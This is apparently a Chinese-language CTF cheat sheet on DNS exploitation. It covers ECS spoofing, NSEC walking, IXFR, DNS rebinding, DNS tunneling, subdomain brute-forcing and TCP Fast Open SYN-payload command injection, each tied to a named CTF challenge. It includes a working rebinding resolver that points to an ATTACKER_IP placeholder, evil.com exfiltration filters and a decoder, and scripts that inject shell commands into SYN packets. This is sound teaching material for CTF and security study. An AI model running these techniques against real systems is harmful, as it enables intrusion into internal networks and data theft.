# CTF Misc - DNS 利用技术

## 目录
- [EDNS Client Subnet (ECS) 欺骗](#edns-client-subnet-ecs-spoofing)
- [DNSSEC NSEC 遍历](#dnssec-nsec-walking)
- [增量区域传输 (IXFR)](#incremental-zone-transfer-ixfr)
- [DNS 重新绑定](#dns-rebinding)
- [DNS 隧道 / 数据外泄](#dns-tunneling--exfiltration)
- [DNS 枚举快速参考](#dns-enumeration-quick-reference)
- [DNS 轮询 A 记录枚举 (EKOPARTY 2017)](#dns-round-robin-a-record-enumeration-ekoparty-2017)
- [DNS 迷宫遍历 (hxp CTF 2017)](#dns-maze-traversal-hxp-ctf-2017)
- [TCP Fast Open SYN-Payload 命令注入 (Insomnihack 2019)](#tcp-fast-open-syn-payload-command-injection-insomnihack-2019)

---

## EDNS Client Subnet (ECS) 欺骗
**模式 (DragoNflieS, Nullcon 2026)：** DNS 服务器根据客户端 IP 返回不同记录。利用 ECS 选项伪造源地址。

```bash
# 使用 ECS 选项的 dig
dig @52.59.124.14 -p 5053 flag.example.com TXT +subnet=10.13.37.1/24
```

```python
import dns.edns, dns.query, dns.message

q = dns.message.make_query("flag.example.com", "TXT", use_edns=True)
ecs = dns.edns.ECSOption("10.13.37.1", 24, 0)  # 内部网络子网
q.use_edns(0, 0, 8192, options=[ecs])
r = dns.query.udp(q, "target_ip", port=5053, timeout=1.5)
for rrset in r.answer:
    for rd in rrset:
        print(b"".join(rd.strings).decode())
```

**关键点：** 尝试使用“leet-speak”子网如 `10.13.37.0/24`（1337），常见内部网段（`10.0.0.0/8`，`172.16.0.0/12`，`192.168.0.0/16`）。

## DNSSEC NSEC 遍历
**模式 (DiNoS, Nullcon 2026)：** DNSSEC 区域中的 NSEC 记录通过链向下一个域名，泄露所有域名。

```python
import subprocess, re

def walk_nsec(server, port, base_domain):
    """遍历 NSEC 链以枚举整个区域。"""
    current = base_domain
    visited = set()
    records = []
    while current not in visited:
        visited.add(current)
        out = subprocess.check_output(
            ["dig", f"@{server}", "-p", str(port), "ANY", current, "+dnssec"],
            text=True)
        # 提取 TXT 记录
        for m in re.finditer(r'TXT\s+"([^"]*)"', out):
            records.append((current, m.group(1)))
        # 跟随 NSEC 链
        m = re.search(r'NSEC\s+(\S+)', out)
        if m:
            current = m.group(1).rstrip('.')
        else:
            break
    return records
```

## 增量区域传输 (IXFR)
**模式 (Zoney, Nullcon 2026)：** 当 AXFR 被阻止时，从旧序列号开始的 IXFR 可揭示区域更新历史，包括已删除的记录。

```bash
# AXFR 被阻止？尝试从序列号 0 开始的 IXFR
dig @server -p 5054 flag.example.com IXFR=0
# 在差异输出中查找历史 TXT 记录
```

**IXFR 输出格式：** 差异显示成对的 SOA 记录包围添加/删除的记录。旧 SOA 和新 SOA 之间的记录被删除；新 SOA 之后的记录被添加。被删除的 TXT 记录通常包含 flag 片段。

---

## DNS 重新绑定

**模式：** 通过让 DNS 名称随时间解析到不同 IP，绕过同源策略或基于 IP 的访问控制。

**工作原理：**
1. 攻击者控制 `evil.com` 的 DNS，TTL 非常低（例如 1 秒）
2. 第一次解析：`evil.com` -> 攻击者 IP（提供恶意 JS）
3. 第二次解析：`evil.com` -> `127.0.0.1`（或内部 IP）
4. 浏览器的同源策略允许 `evil.com` 上的 JS 访问新的 IP

```python
# 简单的 DNS 重新绑定服务器（Python + dnslib）
from dnslib import DNSRecord, RR, A
from dnslib.server import DNSServer, BaseResolver

class RebindResolver(BaseResolver):
    def __init__(self):
        self.count = {}

    def resolve(self, request, handler):
        qname = str(request.q.qname)
        self.count[qname] = self.count.get(qname, 0) + 1
        reply = request.reply()

        if self.count[qname] % 2 == 1:
            reply.add_answer(RR(qname, rdata=A("ATTACKER_IP"), ttl=1))
        else:
            reply.add_answer(RR(qname, rdata=A("127.0.0.1"), ttl=1))
        return reply
```

**工具：** [rbndr.us](http://rbndr.us/) 用于快速重新绑定，无需自定义 DNS，[singularity](https://github.com/nccgroup/singularity) 用于自动化攻击。

---
## DNS 隧道 / 数据外泄

**模式：** 通过 DNS 查询（子域名）或响应（TXT 记录）进行数据外泄。

**在 PCAP 中检测：**
```bash
# 从 pcap 中提取 DNS 查询
tshark -r capture.pcap -Y "dns.qry.type == 1" \
    -T fields -e dns.qry.name | sort -u

# 查找编码的子域名（hex、base32、base64url）
tshark -r capture.pcap -Y "dns.qry.name contains '.evil.com'" \
    -T fields -e dns.qry.name
```

**解码外泄数据：**
```python
import base64

# 基于子域名的外泄：data.chunk1.evil.com, data.chunk2.evil.com
queries = [...]  # 提取的 DNS 查询名
chunks = [q.split('.')[0] for q in queries if q.endswith('.evil.com')]
decoded = base64.b32decode(''.join(chunks).upper() + '====')
print(decoded)
```

**PCAP 中基于 DNS 的 C2：**
```bash
tshark -r capture.pcap -Y "dns.qry.type == 16" \
    -T fields -e dns.qry.name -e dns.txt
```

---

## DNS 轮询 A 记录枚举 (EKOPARTY 2017)

**模式：** 域名配置了多个轮询的 A 记录，指向不同的后端 IP。只有部分 IP 提供相关的 HTTP 内容。通过反复查询收集所有 IP，然后扫描并对每个 IP 发起带虚拟主机请求。

```bash
# 获取所有 A 记录（多次查询以获取轮询结果）
for i in $(seq 1 100); do dig +short target.com A; done | sort -u > ips.txt

# 扫描每个 IP 的 80 端口并使用正确的 Host 头请求
while read ip; do
    response=$(curl -s -m 3 -H "Host: target.com" "http://$ip/")
    if echo "$response" | grep -q "flag"; then
        echo "Found on $ip"
        echo "$response"
    fi
done < ips.txt
```

**关键洞察：** DNS 轮询配合异构后端可以将内容隐藏在多个 IP 上。单次 DNS 查询可能无法返回所有记录——需要多次查询（50-100 次）并去重以穷尽记录集。然后对每个 IP 发起带虚拟主机头的直接请求（`-H "Host: target.com"`）以实现完整覆盖。

---

## DNS 迷宫遍历 (hxp CTF 2017)

一个以 DNS 记录编码的迷宫：每个 UUID 子域是一个位置，`dig -t txt` 提供提示，方向子域的 CNAME 记录指向相邻位置：

```python
import dns.resolver
def get_neighbors(uuid, domain):
    neighbors = {}
    for direction in ['up', 'down', 'left', 'right']:
        try:
            answer = dns.resolver.resolve(f'{direction}.{uuid}.{domain}', 'CNAME')
            neighbors[direction] = str(answer[0]).split('.')[0]
        except: pass
    return neighbors

# 广度优先搜索寻找出口
from collections import deque
queue = deque([(start_uuid, [start_uuid])])
visited = {start_uuid}
while queue:
    current, path = queue.popleft()
    txt = dns.resolver.resolve(f'{current}.{domain}', 'TXT')
    if 'flag' in str(txt[0]):
        print(f"Found flag at {current}: {txt[0]}")
        break
    for direction, next_uuid in get_neighbors(current, domain).items():
        if next_uuid not in visited:
            visited.add(next_uuid)
            queue.append((next_uuid, path + [next_uuid]))
```

**关键洞察：** DNS 记录可以编码任意图结构。每个节点是一个子域（UUID），边是方向子域上的 CNAME 记录（up/down/left/right.UUID.domain），节点数据存储在 TXT 记录中。使用标准图搜索算法（BFS/DFS）即可解决。要积极缓存——DNS 往返时间是运行时瓶颈。推荐使用 `dns.resolver`（dnspython）而非子进程调用 `dig` 以提升性能。

---

## DNS 枚举快速参考

```bash
# 标准区域传送尝试
dig @ns.target.com target.com AXFR

# 爆破子域名
for sub in $(cat wordlist.txt); do
    dig +short "$sub.target.com" && echo "$sub"
done

# 反向 DNS 扫描
for i in $(seq 1 254); do
    dig +short -x 10.0.0.$i
done

# 检查通配符 DNS
dig randomnonexistent.target.com
```

---
## TCP Fast Open SYN-Payload 命令注入 (Insomnihack 2019)

**模式：** 某些服务使用 TCP Fast Open（RFC 7413），并在三次握手完成之前处理初始 SYN 包中携带的约 1460 字节的数据。如果处理程序将这些字节传递给命令解释器，则可以在未建立完整连接的情况下调用命令——对标准 TCP 扫描显示为关闭/过滤的端口，仅对带数据的 SYN 响应。CTF 中常见的提示是提到“RFC 741x”、“fast open”或“knock with data”。

```python
# Linux 内核：启用客户端 TFO：sysctl -w net.ipv4.tcp_fastopen=5
# Python 套接字通过第一次 sendto() 的 MSG_FASTOPEN 支持 TFO。
import socket
MSG_FASTOPEN = 0x20000000

def tfo_send(host, port, payload: bytes, timeout=3.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.sendto(payload, MSG_FASTOPEN, (host, port))
    try:
        return s.recv(65536)
    finally:
        s.close()

# Scapy 变体：带负载的原始 SYN（测试时不需要内核 TFO cookie）
# from scapy.all import IP, TCP, send
# send(IP(dst=host)/TCP(dport=port, flags='S', seq=1)/b'SyN ls -la')

print(tfo_send('10.13.37.99', 3737, b'SyN cat ./secret/me/not/flag.txt'))
```

**关键洞察：** 经典端口扫描（`nmap -sS`、`nc -vz`）不携带 SYN 数据，因此仅支持 TFO 的服务看起来无响应。当挑战提示 RFC 7413 或“knock with data”时，将负载*放入* SYN 包中（通过 `MSG_FASTOPEN` 或定制的 Scapy 包）并观察响应。前缀（此处为 "SyN"）通常是服务的认证令牌，因为它出现在任何嗅探到的 SYN 的前 3-4 字节中。

**参考资料：** Insomnihack 2019 — Net1，writeups 13988、13989、13990
